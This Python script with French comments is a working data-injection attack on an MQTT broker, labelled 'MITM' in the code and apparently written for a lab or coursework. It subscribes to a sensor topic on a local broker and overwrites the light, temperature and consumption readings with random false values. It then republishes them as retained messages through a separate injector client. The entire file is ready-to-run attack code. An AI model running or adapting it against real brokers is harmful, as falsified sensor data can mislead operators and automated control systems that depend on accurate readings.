import json
import paho.mqtt.client as mqtt
import numpy as np
import time

broker = "192.168.0.3" 
port = 1883
topic = "sensors/consommation/data_sensor"
# Délai minimal entre deux messages MITM 
MITM_INTERVAL = 5.0 # 5 secondes
last_mitm_sent = 0.0  # Timestamp du dernier message MITM envoyé

# Callback connexion
def on_connect(client, userdata, flags, rc):
    print("Connecte au broker. Souscription au topic...")
    client.subscribe(topic)

def on_message(client, userdata, msg):
    global last_mitm_sent
    try:
        current_time = time.time()
        if current_time - last_mitm_sent < MITM_INTERVAL:
            return  # Ignore les messages trop fréquents

        payload = msg.payload.decode()
        print(f"Message intercepté :\n{payload}\n")

        data = json.loads(payload)

        if "data_sensor" in data and "consommation" in data:
            old = data["data_sensor"].copy()
            old_consommation = data.get("consommation")

            # Falsification des valeurs
            data["data_sensor"]["light"] = round(np.random.uniform(52, 1000), 2) 
            data["data_sensor"]["temperature"] = round(np.random.uniform(32, 160), 2)
            data["consommation"] = round(np.random.uniform(100, 500), 2)

            print("Anciennes valeurs :")
            print("consommation:", old_consommation, " | sensor:", old)
            print("Nouvelles valeurs injectées :")
            print("consommation:", data["consommation"], 
                  "temperature:", data["data_sensor"]["temperature"],
                  "light:", data["data_sensor"]["light"])

            # Vérification que le JSON est bien sérialisable
            try:
                new_payload = json.dumps(data)
            except Exception as e:
                print(f"Erreur lors de la sérialisation JSON : {e}")
                return

            # Envoi du message falsifié
            result = injector.publish(topic, new_payload, qos=1, retain=True)
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                print("Message modifié publie avec succes.\n")
                last_mitm_sent = current_time
            else:
                print(f" Échec de publication : {mqtt.error_string(result.rc)}")

    except json.JSONDecodeError as je:
        print(f"Erreur de decodage JSON : {je}")
    except KeyError as ke:
        print(f"Champ manquant dans le payload : {ke}")
    except Exception as e:
        print(f"Erreur generale : {str(e)}")
        print(f"Type d'erreur: {type(e).__name__}")
        if hasattr(e, 'errno'):
            print(f"Code erreur: {e.errno}")

# MQTT clients
sniffer = mqtt.Client("sniffer")
sniffer.on_connect = on_connect
sniffer.on_message = on_message

injector = mqtt.Client("injector")

def on_injector_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Injecteur connecte au broker")
    else:
        print(f"Erreur de connexion de l'injecteur: {mqtt.error_string(rc)}")
        exit(1)

injector.on_connect = on_injector_connect
injector.connect(broker, port, 60)
injector.loop_start()

# Lancement de l'écoute
sniffer.connect(broker, port)
print("MITM actif, en attente de messages\n")
sniffer.loop_forever()
